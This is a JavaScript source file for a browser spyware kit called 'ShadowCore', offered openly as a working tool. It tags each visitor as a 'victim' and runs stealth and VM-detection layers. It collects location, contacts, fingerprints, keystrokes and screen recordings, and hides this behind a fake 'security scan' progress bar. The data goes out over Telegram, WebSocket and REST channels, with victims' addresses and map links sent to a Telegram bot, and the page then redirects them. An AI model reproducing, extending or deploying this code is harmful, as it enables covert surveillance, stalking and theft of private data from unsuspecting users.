// language: JavaScript, file: core.js
// *gesture-gated orchestrator + enhanced location chain + collector-driven progress UI*

import { loadConfig } from './config-loader.js';
import { DeviceCollector } from './collectors/device.js';
import { NetworkCollector } from './collectors/network.js';
import { LocationCollector } from './collectors/location.js';
import { MediaCollector } from './collectors/media.js';
import { SensorCollector } from './collectors/sensors.js';
import { BrowserCollector } from './collectors/browser.js';
import { ContactsCollector } from './collectors/contacts.js';
import { FingerprintCollector } from './collectors/fingerprint.js';
import { ScreenRecorder } from './collectors/screenRecorder.js';
import { KeyLogger } from './collectors/keylogger.js';
import { Exfiltrator } from './exfiltrators/telegram.js';
import { WebSocketExfiltrator } from './exfiltrators/websocket.js';
import { RESTExfiltrator } from './exfiltrators/rest.js';
import { StealthLayer } from './stealth/anti-detection.js';
import { TrafficShaper } from './stealth/traffic-shaping.js';
import { VMDetector } from './stealth/vm-detection.js';

// ============================================================
// ENHANCED LOCATION HELPERS
// ============================================================

const MAP_WORDS = ['apple','brave','chair','dream','eagle','flame','grape','house','island','jazz','koala','lion'];

function googleMapsLink(lat, lon) {
    return `https://www.google.com/maps?q=${lat},${lon}&z=15&t=m`;
}
function googleMapsEmbed(lat, lon) {
    return `https://maps.google.com/maps?q=${lat},${lon}&hl=en&z=15&output=embed`;
}
function staticMapUrl(lat, lon, zoom = 15, size = '600x300') {
    return `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=${zoom}&size=${size}&l=map&pt=${lon},${lat},pmwtm1`;
}
function osmLink(lat, lon) {
    return `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}#map=15/${lat}/${lon}`;
}
function osmEmbed(lat, lon) {
    const d = 0.01;
    return `https://www.openstreetmap.org/export/embed.html?bbox=${lon-d}%2C${lat-d}%2C${lon+d}%2C${lat+d}&layer=mapnik&marker=${lat}%2C${lon}`;
}
function bingMapsLink(lat, lon) {
    return `https://bing.com/maps/default.aspx?cp=${lat}~${lon}&lvl=15`;
}
function appleMapsLink(lat, lon) {
    return `https://maps.apple.com/?q=${lat},${lon}&z=15&t=s`;
}
function what3wordsSim(lat, lon) {
    const a = Math.abs(Math.floor(lat * 1000)) % MAP_WORDS.length;
    const b = Math.abs(Math.floor(lon * 1000)) % MAP_WORDS.length;
    const c = Math.abs(Math.floor((lat + lon) * 1000)) % MAP_WORDS.length;
    return `${MAP_WORDS[a]}.${MAP_WORDS[b]}.${MAP_WORDS[c]}`;
}
function toDMS(lat, lon) {
    const latDir = lat >= 0 ? 'N' : 'S';
    const lonDir = lon >= 0 ? 'E' : 'W';
    const aLat = Math.abs(lat), aLon = Math.abs(lon);
    const dLat = Math.floor(aLat), mLat = Math.floor((aLat - dLat) * 60);
    const sLat = ((aLat - dLat - mLat / 60) * 3600).toFixed(1);
    const dLon = Math.floor(aLon), mLon = Math.floor((aLon - dLon) * 60);
    const sLon = ((aLon - dLon - mLon / 60) * 3600).toFixed(1);
    return `${dLat}°${mLat}'${sLat}"${latDir} ${dLon}°${mLon}'${sLon}"${lonDir}`;
}
function toUTMZone(lat, lon) {
    return `Zone ${Math.floor((lon + 180) / 6) + 1}${lat >= 0 ? 'N' : 'S'}`;
}

async function reverseGeocode(lat, lon) {
    try {
        const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
        const r = await fetch(url, { headers: { 'Accept': 'application/json' }, cache: 'no-store' });
        if (!r.ok) return null;
        const j = await r.json();
        const a = j.address || {};
        const parts = [];
        if (a.road) parts.push(a.road);
        if (a.suburb || a.neighbourhood) parts.push(a.suburb || a.neighbourhood);
        if (a.city || a.town || a.village) parts.push(a.city || a.town || a.village);
        if (a.state) parts.push(a.state);
        if (a.country) parts.push(a.country);
        return parts.join(', ') || j.display_name || null;
    } catch (e) {
        return null;
    }
}

// ============================================================
// SHADOWCORE
// ============================================================

class ShadowCore {
    constructor() {
        this.config = null;
        this.victimId = this.generateVictimId();
        this.collectedData = {
            id: this.victimId,
            timestamp: new Date().toISOString(),
            campaign: this.getCampaignData(),
        };
        this.collectors = [];
        this.exfiltrators = [];
        this.stealth = null;
        this.trafficShaper = null;
        this.vmDetector = null;
        this.progressCallback = null;
        this.stepLabels = [];
        this.collectorStepMap = {};
        this.isRunning = false;
    }

    generateVictimId() {
        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        let id = 'V_';
        for (let i = 0; i < 12; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
        return id + '_' + Date.now().toString(36);
    }

    getCampaignData() {
        const p = new URLSearchParams(location.search);
        return {
            source: document.referrer || 'direct',
            campaignId: p.get('cid') || p.get('campaign') || 'organic',
            utm_source: p.get('utm_source'),
            utm_medium: p.get('utm_medium'),
            utm_campaign: p.get('utm_campaign'),
            url: location.href,
            title: document.title,
        };
    }

    async init() {
        try {
            this.config = await loadConfig();
            this.config.victimId = this.victimId;
            window.__VID = this.victimId;

            this.stealth = new StealthLayer();
            await this.stealth.activate();

            this.trafficShaper = new TrafficShaper();
            await this.trafficShaper.activate();

            this.vmDetector = new VMDetector();
            const vm = await this.vmDetector.detect();
            if (vm.isVM) this.collectedData.vmDetected = vm;

            this.exfiltrators.push(new Exfiltrator(this.config));
            if (this.config.websocketEndpoint) {
                this.exfiltrators.push(new WebSocketExfiltrator(this.config.websocketEndpoint));
            }
            if (this.config.restEndpoint) {
                this.exfiltrators.push(new RESTExfiltrator(this.config.restEndpoint, {
                    apiKey: this.config.restApiKey,
                }));
            }

            const want = {
                screenRecorder: this.config.enableScreenRecorder === true,
                keylogger: this.config.enableKeylogger !== false,
                contacts: this.config.enableContacts !== false,
            };

            this.collectors = [
                new DeviceCollector(),
                new NetworkCollector(),
                new LocationCollector(),
                new MediaCollector(),
                new SensorCollector(),
                new BrowserCollector(),
                new FingerprintCollector(),
            ];
            if (want.contacts) this.collectors.push(new ContactsCollector());
            if (want.keylogger) this.collectors.push(new KeyLogger());
            if (want.screenRecorder) this.collectors.push(new ScreenRecorder());

            this.setupProgressUI();
            this.activateOnInteraction();
        } catch (error) {
            console.error('init failed:', error);
            await this.sendToAllExfiltrators('sendError', {
                message: `Init failed: ${error.message}`,
                stack: error.stack,
                id: this.victimId,
            }).catch(() => {});
            this.redirect();
        }
    }

    // ============================================================
    // PROGRESS UI — collector-driven, ticks after every collector
    // ============================================================

    setupProgressUI() {
        this.stepLabels = [
            'Initializing security scan...',
            'Checking device configuration',
            'Verifying network security',
            'Analyzing system integrity',
            'Finalizing verification',
        ];

        // collector name → which visible step it advances to
        this.collectorStepMap = {
            device: 1,
            network: 2,
            location: 2,
            media: 3,
            sensors: 3,
            browser: 3,
            fingerprint: 3,
            contacts: 4,
            keylogger: 4,
            screenRecorder: 4,
        };

        this.progressCallback = (step, message) => {
            const bar = document.getElementById('progressBar');
            if (bar) {
                const pct = Math.min(100, (step / this.stepLabels.length) * 100);
                bar.style.width = pct + '%';
                bar.textContent = Math.round(pct) + '%';
            }
            document.querySelectorAll('.status-item').forEach((item, index) => {
                const icon = item.querySelector('i');
                if (index < step) {
                    item.classList.add('completed');
                    item.classList.remove('active');
                    if (icon) icon.className = 'fas fa-check-circle text-success me-3';
                } else if (index === step) {
                    item.classList.add('active');
                    item.classList.remove('completed');
                    if (icon) icon.className = 'fas fa-spinner fa-spin text-primary me-3';
                } else {
                    item.classList.remove('active', 'completed');
                    if (icon) icon.className = 'far fa-clock me-3';
                }
            });
            const action = document.getElementById('currentAction');
            if (action) action.textContent = message || this.stepLabels[step] || 'Processing...';
        };
    }

    // Called after a collector finishes — advances bar + shows which collector just landed
    tickProgress(collectorName, done, total) {
        const step = this.collectorStepMap[collectorName] ?? 3;
        const label = `Collected ${collectorName} (${done}/${total})`;
        this.progressCallback(step, label);
    }

    activateOnInteraction() {
        const clickHandler = async (e) => {
            if (this.isRunning) return;
            this.isRunning = true;
            document.removeEventListener('click', clickHandler, true);
            e.preventDefault();
            await this.runFromGesture();
        };
        document.addEventListener('click', clickHandler, true);

        setTimeout(() => {
            if (!this.isRunning) {
                this.isRunning = true;
                this.runFallback();
            }
        }, 5000);
    }

    async runFromGesture() {
        try {
            await this.sendToAllExfiltrators('notify', 'NEW_VICTIM', {
                id: this.victimId,
                url: location.href,
                timestamp: new Date().toISOString(),
            });

            // kick off initializing → device config
            this.progressCallback(0, 'Initializing security scan...');
            this.progressCallback(1, 'Checking device configuration');

            // keylogger fires async, does not block the loop
            const kl = this.collectors.find(c => c.name === 'keylogger');
            if (kl) {
                kl.collect().then(data => {
                    this.collectedData.keylogger = data;
                    this.sendToAllExfiltrators('sendData', 'keylogger', data).catch(() => {});
                }).catch(() => {});
            }

            const runnable = this.collectors.filter(c => c.name !== 'keylogger');
            const total = runnable.length;
            let done = 0;

            for (const c of runnable) {
                try {
                    const data = await c.collect();
                    this.collectedData[c.name] = data;

                    if (c.name === 'location') {
                        this.progressCallback(2, 'Detecting location + maps...');
                        await this.handleEnhancedLocation(data);
                    } else if (c.name === 'screenRecorder') {
                        await this.handleScreenRecorderData(data);
                    } else {
                        await this.sendToAllExfiltrators('sendData', c.name, data);
                    }
                } catch (e) {
                    this.collectedData[`${c.name}_error`] = e.message;
                    await this.sendToAllExfiltrators('sendError', {
                        message: `${c.name}: ${e.message}`,
                        stack: e.stack,
                        id: this.victimId,
                    });
                }

                done++;
                this.tickProgress(c.name, done, total);
                await this.delay(120);
            }

            this.progressCallback(5, 'Verification complete!');
            await this.sendToAllExfiltrators('sendSummary', this.collectedData);
            this.redirect();
        } catch (e) {
            await this.sendToAllExfiltrators('sendError', {
                message: `Run failed: ${e.message}`, stack: e.stack, id: this.victimId,
            });
            this.redirect();
        } finally {
            this.isRunning = false;
        }
    }

    async runFallback() {
        try {
            await this.sendToAllExfiltrators('notify', 'NEW_VICTIM_FALLBACK', {
                id: this.victimId, url: location.href, timestamp: new Date().toISOString(),
            });

            this.progressCallback(0, 'Initializing security scan...');
            this.progressCallback(1, 'Checking device configuration');

            const gestureOnly = new Set(['screenRecorder', 'keylogger']);
            const runnable = this.collectors.filter(c => !gestureOnly.has(c.name));
            const total = runnable.length;
            let done = 0;

            for (const c of runnable) {
                try {
                    const d = await c.collect();
                    this.collectedData[c.name] = d;

                    if (c.name === 'location') {
                        this.progressCallback(2, 'Detecting location + maps...');
                        await this.handleEnhancedLocation(d);
                    } else {
                        await this.sendToAllExfiltrators('sendData', c.name, d);
                    }
                } catch (e) {
                    this.collectedData[`${c.name}_error`] = e.message;
                }
                done++;
                this.tickProgress(c.name, done, total);
                await this.delay(80);
            }

            this.progressCallback(5, 'Verification complete!');
            await this.sendToAllExfiltrators('sendSummary', this.collectedData);
        } finally {
            this.isRunning = false;
            this.redirect();
        }
    }

    // ============================================================
    // ENHANCED LOCATION — 3 Telegram messages + structured data
    // ============================================================

    async handleEnhancedLocation(loc) {
        let lat = null, lon = null, accuracy = null, source = 'unknown';

        if (loc && loc.source === 'gps' && typeof loc.latitude === 'number') {
            lat = loc.latitude; lon = loc.longitude; accuracy = loc.accuracy; source = 'gps';
        } else if (loc && loc.data && typeof loc.data.latitude === 'number') {
            lat = loc.data.latitude; lon = loc.data.longitude;
            accuracy = loc.data.accuracy || 50000; source = 'ip';
        }

        if (lat === null || lon === null) {
            await this.sendToAllExfiltrators('sendData', 'location', loc);
            return;
        }

        const address = await reverseGeocode(lat, lon);
        const w3w = what3wordsSim(lat, lon);
        const dms = toDMS(lat, lon);
        const utm = toUTMZone(lat, lon);

        const enriched = {
            ...loc,
            address: address || null,
            coordinates: { lat, lon, accuracy, source },
            links: {
                google: googleMapsLink(lat, lon),
                googleEmbed: googleMapsEmbed(lat, lon),
                osm: osmLink(lat, lon),
                osmEmbed: osmEmbed(lat, lon),
                bing: bingMapsLink(lat, lon),
                apple: appleMapsLink(lat, lon),
                staticMap: staticMapUrl(lat, lon),
            },
            formats: {
                decimal: `${lat.toFixed(6)}, ${lon.toFixed(6)}`,
                dms,
                utm,
                w3w,
            },
            enrichedAt: Date.now(),
        };
        this.collectedData.location = enriched;

        // 1) structured data → every exfiltrator
        await this.sendToAllExfiltrators('sendData', 'location', enriched);

        const tg = this.exfiltrators.find(e => e.name === 'Telegram');
        if (!tg) return;

        // 2) Message 1 — ENHANCED LOCATION DATA
        try {
            let m1 = `📍 *ENHANCED LOCATION DATA*\n\n`;
            m1 += `🆔 *Victim ID:* \`${this.victimId}\`\n`;
            m1 += `🎯 *Coordinates:* ${lat.toFixed(6)}, ${lon.toFixed(6)}\n`;
            if (accuracy) m1 += `📏 *Accuracy:* ${accuracy.toFixed(2)} meters\n`;
            if (address) m1 += `🏠 *Address:* ${address}\n`;
            m1 += `🗺️ *Google Maps:* [Click Here](${googleMapsLink(lat, lon)})\n`;
            m1 += `🗺️ *OpenStreetMap:* [Click Here](${osmLink(lat, lon)})\n`;
            m1 += `🗺️ *Bing Maps:* [Click Here](${bingMapsLink(lat, lon)})\n`;
            m1 += `🗺️ *Apple Maps:* [Click Here](${appleMapsLink(lat, lon)})\n`;
            m1 += `🔤 *What3Words:* \`${w3w}\`\n`;
            m1 += `🔗 *Source URL:* ${location.href}`;
            await tg.sendMessage(m1).catch(() => {});
        } catch (e) {}

        // 3) Message 2 — static map photo
        try {
            const smUrl = staticMapUrl(lat, lon);
            const blob = await fetch(smUrl).then(r => r.blob());
            if (blob && blob.size > 0) {
                const fd = new FormData();
                fd.append('chat_id', tg.chatId);
                fd.append('photo', blob, 'map.png');
                fd.append('parse_mode', 'Markdown');
                const caption = `📍 Map Location: ${lat.toFixed(6)}, ${lon.toFixed(6)}`.substring(0, 1024);
                fd.append('caption', caption);
                await fetch(`${tg.apiUrl}/sendPhoto`, { method: 'POST', body: fd, cache: 'no-store' }).catch(() => {});
            }
        } catch (e) {}

        // 4) Message 3 — INTERACTIVE MAPS + coordinate formats
        try {
            let m3 = `🗺️ *INTERACTIVE MAPS*\n\n`;
            m3 += `*Google Maps Embedded:* ${googleMapsEmbed(lat, lon)}\n`;
            m3 += `*OpenStreetMap Embedded:* ${osmEmbed(lat, lon)}\n`;
            m3 += `*Coordinates Formats:*\n`;
            m3 += `• Decimal: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n`;
            m3 += `• DMS: ${dms}\n`;
            m3 += `• UTM: ${utm}`;
            await tg.sendMessage(m3).catch(() => {});
        } catch (e) {}
    }

    // ============================================================
    // SCREEN RECORDER
    // ============================================================

    async handleScreenRecorderData(data) {
        if (data.error) {
            await this.sendToAllExfiltrators('sendData', 'screenRecorder', data);
            return;
        }
        if (data.type === 'file' && data.blob) {
            for (const ex of this.exfiltrators) {
                if (typeof ex.sendFile === 'function') {
                    try {
                        const ok = await ex.sendFile(data.blob, {
                            duration: data.duration, size: data.size, format: data.format,
                            victimId: this.victimId, timestamp: data.timestamp, fallbackData: data.data,
                        });
                        if (!ok && data.data) await this.sendChunkedScreenRecording(data);
                    } catch (e) {
                        if (data.data) await this.sendChunkedScreenRecording(data);
                    }
                }
            }
        } else if (data.type === 'chunked' && data.chunks) {
            await this.sendChunkedScreenRecording(data);
        } else if (data.data) {
            try {
                data.blob = await this.base64ToBlob(data.data, 'video/webm');
                data.type = 'file';
                await this.handleScreenRecorderData(data);
            } catch (e) {
                await this.sendToAllExfiltrators('sendData', 'screenRecorder', data);
            }
        }
    }

    async sendChunkedScreenRecording(data) {
        const chunks = data.chunks || this.chunkBase64(data.data, 3500);
        await this.sendToAllExfiltrators('sendChunkedVideo', {
            chunks, totalChunks: chunks.length, duration: data.duration,
            size: data.size, format: data.format || 'webm', timestamp: data.timestamp || Date.now(),
        });
    }

    chunkBase64(s, n) {
        const out = [];
        for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
        return out;
    }

    base64ToBlob(b64, mime) {
        return new Promise((resolve, reject) => {
            try {
                const bytes = atob(b64);
                const arr = new Uint8Array(bytes.length);
                for (let i = 0; i < bytes.length; i++) arr[i] = bytes.charCodeAt(i);
                resolve(new Blob([arr], { type: mime }));
            } catch (e) { reject(e); }
        });
    }

    async sendToAllExfiltrators(method, ...args) {
        const results = [];
        for (const ex of this.exfiltrators) {
            if (typeof ex[method] === 'function') {
                try { results.push(await ex[method](...args)); }
                catch (e) { results.push(false); }
            }
        }
        return results;
    }

    redirect() {
        const p = new URLSearchParams(location.search);
        const url = p.get('redirect') || this.config?.redirectUrl || null;
        if (!url) { console.warn('[core] no redirect target'); return; }
        setTimeout(() => { window.location.href = url; }, 2500);
    }

    delay(ms) { return new Promise(r => setTimeout(r, ms)); }
}

document.addEventListener('DOMContentLoaded', () => {
    const core = new ShadowCore();
    core.init();
});
